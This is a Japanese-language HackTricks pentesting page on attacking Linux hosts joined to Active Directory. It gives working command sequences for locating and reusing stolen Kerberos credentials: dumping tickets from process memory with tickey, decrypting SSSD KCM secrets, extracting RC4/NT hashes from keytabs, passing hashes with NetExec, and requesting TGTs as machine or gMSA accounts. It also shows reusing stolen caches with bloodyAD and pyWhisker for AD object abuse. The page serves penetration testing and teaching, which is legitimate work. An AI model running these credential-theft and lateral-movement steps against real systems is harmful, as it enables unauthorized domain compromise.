# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

LinuxマシンもActive Directory環境内に存在し得ます。

AD内のLinuxマシンは、**Kerberos materialをローカルに保存**できます: user ccaches、machine/service keytabs、SSSD-managed secrets。これらのartifactsは通常、他のKerberos credentialと同様に再利用できます。これらの大半を読み取るには、ticketのuser ownerであるか、そのマシンの**root**である必要があります。

## Enumeration

### AD enumeration from linux

Linux上でADへのアクセス権がある場合（またはWindows上のbash）なら、[https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) を使ってADをenumerateできます。

また、以下のページで**linuxからADをenumerateする他の方法**も確認できます:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPAは、主に**Unix**環境向けのMicrosoft Windows **Active Directory**のオープンソース**alternative**です。Active Directoryに似た管理のために、完全な**LDAP directory**とMIT **Kerberos** Key Distribution Centerを組み合わせています。CAとRAのcertificate managementにはDogtag **Certificate System**を利用し、smartcardsを含む**multi-factor** authenticationをサポートします。SSSDはUnix authentication processesに統合されています。詳細は以下を参照してください:


{{#ref}}
../freeipa-pentesting.md
{{#endref}}

### Domain-joined host artefacts

ticketsに触る前に、**ホストがどのようにADに参加したか**、そして**Kerberos materialが実際にどこに保存されているか**を特定してください。現代のLinuxホストでは、これは単なる`/tmp`内のflat filesではなく、通常`realmd` + `adcli` + `sssd`で処理されます:
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
これにより、ホストがADを信頼しているか、SSSDがIDやticketをキャッシュしているか、そして悪用可能な**machine/service keytabs**や**KCM secrets**が利用可能かどうかがすぐに分かります。

## Playing with tickets

### Pass The Ticket

このページでは、Linuxホスト内で**kerberos tickets**を見つけられるさまざまな場所について説明します。次のページでは、これらのCCache tickets形式をKirbi（Windowsで使用する必要がある形式）に変換する方法と、PTT attackを実行する方法も学べます:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

**Linux-specific ticket harvesting workflows** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, etc.) を知りたい場合は、専用ページを確認してください:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### CCACHE ticket reuse from /tmp

CCACHE filesは、**Kerberos credentials**を保存するためのバイナリ形式です。`FILE:/tmp/krb5cc_%{uid}` は今でも一般的ですが、現代のLinux環境では `DIR:/run/user/%{uid}/krb5cc*`、`KEYRING:persistent:%{uid}`、または `KCM:%{uid}` が使われることもあります。ticketが `/tmp` にあると決めつける前に、**`KRB5CCNAME`** 環境変数と `default_ccache_name` 設定を確認してください。
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### keyringからのCCACHE ticket reuse

**プロセスのメモリに保存されたKerberos ticketsは抽出できます**。特に、マシンのptrace protectionが無効になっている場合（`/proc/sys/kernel/yama/ptrace_scope`）です。この目的に役立つツールとして [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey) があります。これは session にinjectして tickets を`/tmp`へdumpすることで抽出を支援します。

このツールを設定して使うには、以下の手順に従います:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
この手順は、さまざまなセッションへの注入を試行し、抽出した tickets を `/tmp` に `__krb_UID.ccache` という命名規則で保存することで成功を示します。

### SSSD KCM からの CCACHE ticket 再利用

SSSD はデータベースのコピーを `/var/lib/sss/secrets/secrets.ldb` に保持しています。対応する key は、`/var/lib/sss/secrets/.secrets.mkey` に hidden file として保存されています。デフォルトでは、この key は **root** 権限がある場合にのみ読み取り可能です。

**`SSSDKCMExtractor`** を `--database` と `--key` パラメータ付きで実行すると、データベースを解析し、**secrets を復号**します。
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
**credential cache Kerberos blob** は、Mimikatz/Rubeus に渡せる使用可能な Kerberos CCache ファイルに変換できます。

### Quick keytab triage
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### Extract accounts from /etc/krb5.keytab

root権限で動作するサービスに不可欠な service account keys は、**`/etc/krb5.keytab`** ファイルに安全に保存されています。これらの keys はサービス用のパスワードに似ており、厳重な機密保持が必要です。

keytab ファイルの内容を確認するには、**`klist`** を使用できます。Linux では、`klist -k -K -e` が principals、key version numbers、encryption types、そして raw key material を表示します。key type が **23 / RC4-HMAC** の場合、その key value はその principal の **NT hash** でもあります。
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Linuxユーザー向けに、**`KeyTabExtract`** は RC4 HMAC ハッシュを抽出する機能を提供し、NTLM ハッシュの再利用に活用できます。ただし、これは keytab にまだ **etype 23 / RC4-HMAC** の material が含まれている場合にのみ有効です。**AES-only** 環境では再利用可能な NT hash は取得できない場合がありますが、それでも Kerberos 経由で keytab を使って直接認証できます。
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
macOS では、**`bifrost`** は keytab file の解析ツールとして使われます。
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
抽出したアカウントと hash 情報を利用して、**`NetExec`** のようなツールを使ってサーバーへ接続できます。
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
```
### `/etc/krb5.keytab` から machine account を再利用する

`realmd`/`adcli`/`sssd` で join されたシステムでは、`/etc/krb5.keytab` には通常 **computer account** と 1つ以上の **host/service principals** が含まれています。**root** 権限があるなら、ただ dump するだけではなく、`klist -k` で表示される principal の1つを使って TGT を要求し、Linux host 自体として操作してください。
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
これは、**computer object** 自体が AD で delegated rights を持っている場合や、ホストが **gMSA** などの他の secrets を取得できる場合に特に有用です。

### stolen Kerberos material を Linux-first AD tooling で再利用する

有効な `ccache` か使用可能な keytab を手に入れたら、まず Windows 形式に変換することなく、Linux から**直接** AD に対して操作できます。多くの modern tools は `KRB5CCNAME` / Kerberos auth をネイティブに受け付けます:
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
これは **Linux post-exploitation** と **AD object abuse** をつなぐよい橋渡しです。object-level の abuse パス自体については、以下を確認してください:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account artefacts

最近の Linux 展開では、**Managed Service Accounts** を AD から直接利用できます。実際には、これは Linux サーバーを侵害した後、ホストの keytab だけでなく、gMSA から生成された **service-specific keytabs** も見つかる可能性があることを意味します。確認すべき一般的な場所は `/etc/gmsad.conf`、展開固有の設定ファイル、そして `/etc` 配下の追加の `*.keytab` ファイルです。
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
これは、その gMSA に紐づく SPNs に対して再利用可能な Kerberos identity を、**Windows endpoint に一切触れることなく**与えます。AD でより高い権限を得た後の **domain-side** gMSA/dMSA abuse については、以下を参照してください:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating_rhel-systems-directly-with-active-directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating_rhel-systems-directly-with-active-directory)

{{#include ../../banners/hacktricks-training.md}}
